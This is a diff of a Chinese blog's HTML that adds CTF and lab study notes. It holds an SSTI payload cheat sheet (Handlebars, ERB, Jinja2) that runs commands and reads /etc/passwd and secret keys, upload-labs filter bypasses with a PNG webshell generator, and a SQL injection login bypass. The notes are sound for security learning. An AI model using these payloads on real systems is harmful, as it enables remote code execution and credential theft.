&#123;&#123;/with&#125;&#125;</span><br><span class="line">  &#123;&#123;/with&#125;&#125;</span><br><span class="line">&#123;&#123;/with&#125;&#125;</span><br><span class="line"></span><br><span class="line">URLencoded:</span><br><span class="line">%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D</span><br></pre></td></tr></table></figure>
+<h3 id="ERB-Ruby"><a href="#ERB-Ruby" class="headerlink" title="ERB (Ruby)"></a>ERB (Ruby)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = &#123;&#123;7*7&#125;&#125;</span><br><span class="line">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="line">&lt;%= 7*7 %&gt; = 49</span><br><span class="line">&lt;%= foobar %&gt; = Error</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= system(&quot;whoami&quot;) %&gt; #Execute code</span><br><span class="line">&lt;%= Dir.entries(&#x27;/&#x27;) %&gt; #List folder</span><br><span class="line">&lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt; #Read file</span><br><span class="line"></span><br><span class="line">&lt;%= system(&#x27;cat /etc/passwd&#x27;) %&gt;</span><br><span class="line">&lt;%= `ls /` %&gt;</span><br><span class="line">&lt;%= IO.popen(&#x27;ls /&#x27;).readlines()  %&gt;</span><br><span class="line">&lt;% require &#x27;open3&#x27; %&gt;&lt;% @a,@b,@c,@d=Open3.popen3(&#x27;whoami&#x27;) %&gt;&lt;%= @b.readline()%&gt;</span><br><span class="line">&lt;% require &#x27;open4&#x27; %&gt;&lt;% @a,@b,@c,@d=Open4.popen4(&#x27;whoami&#x27;) %&gt;&lt;%= @c.readline()%&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Tornado-Python"><a href="#Tornado-Python" class="headerlink" title="Tornado (Python)"></a>Tornado (Python)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = 49</span><br><span class="line">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="line">&#123;&#123;foobar&#125;&#125; = Error</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; = 7777777</span><br></pre></td></tr></table></figure>
+<h3 id="Jinja2-Python"><a href="#Jinja2-Python" class="headerlink" title="Jinja2 (Python)"></a>Jinja2 (Python)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = Error</span><br><span class="line">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="line">&#123;&#123;foobar&#125;&#125; Nothing</span><br><span class="line">&#123;&#123;4*4&#125;&#125;[[5*5]]</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; = 7777777</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123;settings.SECRET_KEY&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Jinja2-Template-format"><a href="#Jinja2-Template-format" class="headerlink" title="Jinja2 - Template format"></a>Jinja2 - Template format</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;layout.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">  &#123;% for user in users %&#125;</span><br><span class="line">    &lt;li&gt;&lt;a href=&quot;&#123;&#123; user.url &#125;&#125;&quot;&gt;&#123;&#123; user.username &#125;&#125;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="xss相关"><a href="#xss相关" class="headerlink" title="xss相关"></a>xss相关</h2><p>Go语言允许定义一整个模板且之后使用，可能让payload变成这样：<code>&#123;&#123;define "T1"&#125;&#125;&lt;script&gt;alert(1)&lt;/script&gt;&#123;&#123;end&#125;&#125; &#123;&#123;template "T1"&#125;&#125;</code></p>
+<h2 id="RCE相关"><a href="#RCE相关" class="headerlink" title="RCE相关"></a>RCE相关</h2><p>在Go语言中可以以类似<code>&#123;&#123; .System "ls" &#125;&#125;</code>使用命令<br>需要源代码类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">func (p Person) Secret (test string) string &#123;</span><br><span class="line">	out, _ := exec.Command(test).CombinedOutput()</span><br><span class="line">	return string(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="ssti-lab-flask-构造payload相关"><a href="#ssti-lab-flask-构造payload相关" class="headerlink" title="ssti-lab(flask)构造payload相关"></a>ssti-lab(flask)构造payload相关</h2><h3 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__</span><br></pre></td></tr></table></figure>
+<p>用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 是类的一个内置属性，表示类的类型； 也是类的实例的属性，表示实例对象的类。<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__bases__</span><br></pre></td></tr></table></figure>
+<p>用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的元组。<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__bases__</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__mro__</span><br></pre></td></tr></table></figure>
+<p>获取基类，包含了当前类对象所有继承的基类<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()</span><br></pre></td></tr></table></figure>
+<p>获取当前类的所有子类，即Object的子类。通过拿到Object的子类，使用其中的一些函数，进行文件读取或者命令执行。<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__</span><br></pre></td></tr></table></figure>
+<p>重载子类，获取子类初始化的属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__globals__</span><br></pre></td></tr></table></figure>
+<p>函数会以字典的形式返回当前位置的全部全局变量<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os._wrap_close.__init__.__globals__   可以获取到os中的一些函数，进行文件读取。</span><br></pre></td></tr></table></figure>
+<h3 id="解题示例"><a href="#解题示例" class="headerlink" title="解题示例"></a>解题示例</h3><h4 id="一句话形式"><a href="#一句话形式" class="headerlink" title="一句话形式"></a>一句话形式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;//依不同题目替换此行</span><br><span class="line">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:5000/level/1&quot;</span><br><span class="line"></span><br><span class="line">for i in range(300):</span><br><span class="line">    data = &#123;&quot;code&quot;: &#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;+ str(i) +&#x27;]&#125;&#125;&#x27;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        #print(data)</span><br><span class="line">        #print(response.text)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &quot;_wrap_close&quot; in response.text:</span><br><span class="line">                print(i,&quot;-----&gt;&quot;,response.text)</span><br><span class="line">                break</span><br><span class="line">    except :</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+<p>构造出来的payload示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[147].__init__.__globals__[&#x27;popen&#x27;](&#x27;type flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/10/sstinote/" data-id="cll59g8v30004agudgv578nbg" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-upload-lab" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/08/03/upload-lab/" class="article-date">
+  <time datetime="2023-08-03T15:19:20.000Z" itemprop="datePublished">2023-08-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/08/03/upload-lab/">2023/08/03：upload-lab记录</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Pass-1"><a href="#Pass-1" class="headerlink" title="Pass 1"></a>Pass 1</h2><p>F12查看前端，可知仅为前端过滤，浏览器禁用脚本即可</p>
+<h2 id="Pass-2"><a href="#Pass-2" class="headerlink" title="Pass 2"></a>Pass 2</h2><p>MIME检测<br>抓包更改type字段即可</p>
+<h2 id="Pass-3"><a href="#Pass-3" class="headerlink" title="Pass 3"></a>Pass 3</h2><p>后缀名检测<br>更改文件后缀即可，如把php改为php5</p>
+<h2 id="Pass-4"><a href="#Pass-4" class="headerlink" title="Pass 4"></a>Pass 4</h2><p>黑名单绕过<br>.htaccess文件绕过<br>生成文件.htaccess写入<code>SetHandler application/x-httpd-php</code><br>将该文件上传至服务器<br>修改一句话木马为图片后缀</p>
+<h2 id="Pass-5"><a href="#Pass-5" class="headerlink" title="Pass 5"></a>Pass 5</h2><p>黑名单绕过<br>过滤为删除文件名末尾的点，可以将后缀设置为<code>.PHP</code></p>
+<h2 id="Pass-6"><a href="#Pass-6" class="headerlink" title="Pass 6"></a>Pass 6</h2><p>黑名单空格绕过<br><code>1.php </code></p>
+<h2 id="Pass-7"><a href="#Pass-7" class="headerlink" title="Pass 7"></a>Pass 7</h2><p>黑名单点绕过<br>可该为<code>1.php.</code></p>
+<h2 id="Pass-8"><a href="#Pass-8" class="headerlink" title="Pass 8"></a>Pass 8</h2><p>黑名单<code>::$DATA</code><br><code>1.php.</code>或<code>1.php::$DATA</code></p>
+<h2 id="Pass-9"><a href="#Pass-9" class="headerlink" title="Pass 9"></a>Pass 9</h2><p>黑名单绕过<br><code>1.php::$DATA</code></p>
+<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass 10"></a>Pass 10</h2><p>双写绕过<br><code>1.pphphp</code></p>
+<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass 11"></a>Pass 11</h2><p>白名单<br>查看源码，发现文件路径可控<br><code>save_path=../upload/1.php%00</code><br><code>filename=&quot;1.png&quot;</code></p>
+<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass 12"></a>Pass 12</h2><p>与上题类似，但这次改为POST传递save-path</p>
+<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass 13"></a>Pass 13</h2><p>该题需要生成图片马<br>源代码会检查文件头两个字节<br>可在cmd中执行<code>copy shelltry.jpg /b + webshell.php /a test.jpg</code>并将其上传，后点击“文件包含漏洞”链接进入利用文件包含漏洞读取文件</p>
+<h2 id="Pass-14-amp-15"><a href="#Pass-14-amp-15" class="headerlink" title="Pass 14 &amp; 15"></a>Pass 14 &amp; 15</h2><p>在上一题的图片马加上文件头（如gif文件需在文件内加<code>GIF89a</code>字段），也可直接上传php后拦截修改</p>
+<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass 16"></a>Pass 16</h2><p>二次渲染绕过<br>来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_72755466/article/details/128499580?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169131954216800182737096%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169131954216800182737096&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-128499580-null-null.142%5Ev92%5EchatsearchT0_1&amp;utm_term=upload-labs%E9%80%9A%E5%85%B3&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_72755466/article/details/128499580?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169131954216800182737096%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169131954216800182737096&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-128499580-null-null.142^v92^chatsearchT0_1&amp;utm_term=upload-labs%E9%80%9A%E5%85%B3&amp;spm=1018.2226.3001.4187</a><br>GIF:<br>首先将GIF文件与php一句话木马合并，再将上传后的文件下载与合并后的文件对比（如010_Editor），在未被渲染的部分写一句话木马<br>PNG:<br>需要脚本构造图片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"> </span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">imagepng($img,&#x27;./1.png&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>1.准备png图片<br>2.在cmd使用php命令执行该脚本生成新png图片<br>3.使用新图片上传<br>4.在文件包含漏洞处进行传参</p>
+<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass 17"></a>Pass 17</h2><p>这关存在逻辑漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在对输入进行验证之前已经将文件移入上传文件夹，可以采用条件竞争<br>用burp拦截数据包发送到测试器模块，在另一个浏览器不断在上传文件的url刷新直到访问成功即可</p>
+<h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass 18"></a>Pass 18</h2><p>审计代码，该代码会先进行文件类型匹配，通过后移动到upload同级目录，再对文件重命名；而在能通过白名单的后缀中，<code>.7z</code>不会被浏览器解析，利用浏览器遇到不能解析的后缀向前解析的特性考虑构造<code>1.php.7z</code>，使用Pass 17的方式尝试上传访问该文件</p>
+<h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass 19"></a>Pass 19</h2><p>定义了黑名单但没有小写转换，仅对保存文件名黑名单处理<br>可以直接大写绕过<code>1.PHP</code></p>
+<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass 20"></a>Pass 20</h2><p>首先会进行MIME检查，之后会对save_name最后一项进行检查<br>因此，抓包后设置<code>save_name[0]</code>与<code>save_name[2]</code>，前者将文件类型设置为php，后者设置为与MIME对应的文件类型</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/03/upload-lab/" data-id="cll59g8v10001agud61iv6pwc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sstilab" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/07/28/sstilab/" class="article-date">
@@ -193,7 +538,24 @@
 <h3 id="roks"><a href="#roks" class="headerlink" title="roks"></a>roks</h3><p>查看源码，通过Dockerfile得知flag.png与image在一个目录下，点击主界面按钮得知会随机展示一张从image来的图片，解码后会检测传入的内容是否含有“/”和“.”，再拼接文件路径</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename = urldecode($_GET[&quot;file&quot;]);</span><br><span class="line">if (str_contains($filename, &quot;/&quot;) or str_contains($filename, &quot;.&quot;)) &#123;</span><br><span class="line">$contentType = mime_content_type(&quot;stopHacking.png&quot;);</span><br><span class="line">header(&quot;Content-type: $contentType&quot;);</span><br><span class="line">readfile(&quot;stopHacking.png&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$filePath = &quot;images/&quot; . urldecode($filename);</span><br><span class="line">$contentType = mime_content_type($filePath);</span><br><span class="line">header(&quot;Content-type: $contentType&quot;);</span><br><span class="line">readfile($filePath);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>瞎了，没看到拼接时还会再解码，二次编码无法通过三次行</p>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+<h3 id="blank"><a href="#blank" class="headerlink" title="blank"></a>blank</h3><p>sql注入，但是sqlite3，部分语句与mysql不同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">...........</span><br><span class="line">app.get(&#x27;/login&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(&#x27;login&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/login&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    const username = req.body.username;</span><br><span class="line">    const password = req.body.password;</span><br><span class="line"></span><br><span class="line">    db.get(&#x27;SELECT * FROM users WHERE username = &quot;&#x27; + username + &#x27;&quot; and password = &quot;&#x27; + password+ &#x27;&quot;&#x27;, (err, row) =&gt; &#123;</span><br><span class="line">    if (err) &#123;</span><br><span class="line">        console.error(err);</span><br><span class="line">        res.status(500).send(&#x27;Error retrieving user&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (row) &#123;</span><br><span class="line">            req.session.loggedIn = true;</span><br><span class="line">            req.session.username = username;</span><br><span class="line">            res.send(&#x27;Login successful!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.status(401).send(&#x27;Invalid username or password&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">..........</span><br><span class="line">app.get(&#x27;/flag&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">if (req.session.username == &quot;admin&quot;) &#123;</span><br><span class="line">    res.send(&#x27;Welcome admin. The flag is &#x27; + fs.readFileSync(&#x27;flag.txt&#x27;,</span><br><span class="line">&#x27;utf8&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">    else if (req.session.loggedIn) &#123;</span><br><span class="line">        res.status(401).send(&#x27;You must be admin to get the flag.&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.status(401).send(&#x27;Unauthorized. Please login first.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>原代码检查是否为admin的password，不报错即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=a&quot;union select 1,2,3/*&amp;username=admin</span><br></pre></td></tr></table></figure>
+<h3 id="Perfect-Picture"><a href="#Perfect-Picture" class="headerlink" title="Perfect Picture"></a>Perfect Picture</h3><p>关键代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def check(uploaded_image):</span><br><span class="line">    with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        flag = f.read()</span><br><span class="line">    with Image.open(app.config[&#x27;UPLOAD_FOLDER&#x27;] + uploaded_image) as image:</span><br><span class="line">        w, h = image.size</span><br><span class="line">        if w != 690 or h != 420:</span><br><span class="line">            return 0</span><br><span class="line">        if image.getpixel((412, 309)) != (52, 146, 235, 123):</span><br><span class="line">            return 0</span><br><span class="line">        if image.getpixel((12, 209)) != (42, 16, 125, 231):</span><br><span class="line">            return 0</span><br><span class="line">        if image.getpixel((264, 143)) != (122, 136, 25, 213):</span><br><span class="line">            return 0</span><br><span class="line">    with exiftool.ExifToolHelper() as et:</span><br><span class="line">        metadata = et.get_metadata(app.config[&#x27;UPLOAD_FOLDER&#x27;] + uploaded_image)[0]</span><br><span class="line">        try:</span><br><span class="line">            if metadata[&quot;PNG:Description&quot;] != &quot;jctf&#123;not_the_flag&#125;&quot;:</span><br><span class="line">                return 0</span><br><span class="line">            if metadata[&quot;PNG:Title&quot;] != &quot;kool_pic&quot;:</span><br><span class="line">                return 0</span><br><span class="line">            if metadata[&quot;PNG:Author&quot;] != &quot;anon&quot;:</span><br><span class="line">                return 0</span><br><span class="line">        except:</span><br><span class="line">            return 0</span><br><span class="line">return flag</span><br></pre></td></tr></table></figure>
+<p>需要上传符合以上要求的图片<br>抄个脚本（exiftool.exe）</p>
